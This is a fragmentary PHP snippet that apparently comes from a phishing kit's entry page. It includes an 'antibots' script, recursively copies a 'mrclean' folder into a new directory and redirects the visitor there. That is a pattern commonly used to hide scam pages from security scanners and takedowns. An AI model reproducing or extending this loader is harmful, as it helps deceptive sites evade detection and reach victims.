...
include "mrclean/antibots/all_antibots.php";
...
$mrclean="mrclean";
function recurse_copy($mrclean,$DIR) {
$dir = opendir($mrclean);
@mkdir($DIR);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($mrclean . '/' . $file) ) {
recurse_copy($mrclean . '/' . $file,$DIR . '/' . $file);
}
else {
copy($mrclean . '/' . $file,$DIR . '/' . $file);
}
}
}
closedir($dir);
}
recurse_copy( $mrclean, $DIR );
#END
//LOCATION !
header("LOCATION: ".$DIR."");
?>
